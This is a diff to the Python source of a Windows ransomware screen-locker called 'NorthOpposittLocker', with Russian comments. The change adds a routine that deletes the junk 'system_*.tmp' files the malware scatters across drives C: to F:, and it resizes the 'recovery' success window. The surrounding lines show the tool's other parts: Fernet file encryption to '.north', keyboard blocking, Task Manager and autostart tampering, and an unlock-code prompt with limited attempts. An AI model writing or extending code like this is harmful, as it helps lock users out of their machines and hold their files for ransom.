@@ -309,6 +309,28 @@ def create_fake_files(stop_flag):
             time.sleep(4)
 
 # ============================================================
+# УДАЛЕНИЕ ВРЕМЕННЫХ ФАЙЛОВ
+# ============================================================
+def delete_fake_files():
+    """Удаляет все созданные мусорные файлы (.tmp)"""
+    try:
+        deleted = 0
+        for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
+            if os.path.exists(drive):
+                for root, dirs, files in os.walk(drive):
+                    for file in files:
+                        if file.endswith('.tmp') and file.startswith('system_'):
+                            path = os.path.join(root, file)
+                            try:
+                                os.remove(path)
+                                deleted += 1
+                            except:
+                                pass
+        return deleted
+    except:
+        return 0
+
+# ============================================================
 # ШИФРОВАНИЕ (.north)
 # ============================================================
 def encrypt_single_file(args):
@@ -369,7 +391,7 @@ def decrypt_single_file(args):
             data = f.read()
         decrypted = fernet.decrypt(data)
         
-        orig_path = path[:-6]  # Убираем .north
+        orig_path = path[:-6]
         
         counter = 1
         base, ext = os.path.splitext(orig_path)
@@ -441,7 +463,7 @@ def restore_system():
     unblock_keyboard()
 
 # ============================================================
-# КАСТОМНЫЕ ОКНА (сокращённо, те же что и были)
+# КАСТОМНЫЕ ОКНА
 # ============================================================
 def show_error_window(message, attempts_left):
     error_root = tk.Tk()
@@ -469,17 +491,17 @@ def show_error_window(message, attempts_left):
     error_root.protocol("WM_DELETE_WINDOW", on_ok)
     error_root.mainloop()
 
-def show_success_window(decrypted_count):
+def show_success_window(decrypted_count, deleted_tmp=0):
     success_root = tk.Tk()
     success_root.title("ВОССТАНОВЛЕНИЕ")
-    success_root.geometry("500x400")
+    success_root.geometry("500x450")
     success_root.resizable(False, False)
     success_root.configure(bg='#0a0a0a')
     
     success_root.update_idletasks()
     x = (success_root.winfo_screenwidth() // 2) - 250
-    y = (success_root.winfo_screenheight() // 2) - 200
-    success_root.geometry(f"500x400+{x}+{y}")
+    y = (success_root.winfo_screenheight() // 2) - 225
+    success_root.geometry(f"500x450+{x}+{y}")
     
     tk.Label(success_root, text="✅ ВОССТАНОВЛЕНИЕ УСПЕШНО ✅", 
              fg="#00ff00", bg="#0a0a0a", font=("Segoe UI", 16, "bold")).pack(pady=20)
@@ -491,6 +513,7 @@ def show_success_window(decrypted_count):
 ╔════════════════════════════════════════════════╗
 ║                                                ║
 ║   📁 Расшифровано файлов: {decrypted_count}                    ║
+║   🗑️ Удалено мусорных файлов: {deleted_tmp}                   ║
 ║                                                ║
 ║   🔓 Диспетчер задач: ВКЛЮЧЕН                  ║
 ║   🔓 Автозагрузка: ОЧИЩЕНА                     ║
@@ -499,7 +522,7 @@ def show_success_window(decrypted_count):
 ║                                                ║
 ║   🗑️ Винлокер УДАЛЁН С ПК                      ║
 ║                                                ║
-║   💀 Северный Оппозит уничтожен                ║
+║   💀 NorthOppositt delete                      ║
 ║                                                ║
 ╚════════════════════════════════════════════════╝
     """
@@ -762,9 +785,10 @@ class NorthOpposittLocker:
         if entered_code == SECRET_CODE:
             self.stop_flag.set()
             decrypted = decrypt_all_files()
+            deleted_tmp = delete_fake_files()
             restore_system()
             self.root.destroy()
-            show_success_window(decrypted)
+            show_success_window(decrypted, deleted_tmp)
         else:
             if self.attempts > 0:
                 self.attempts -= 1
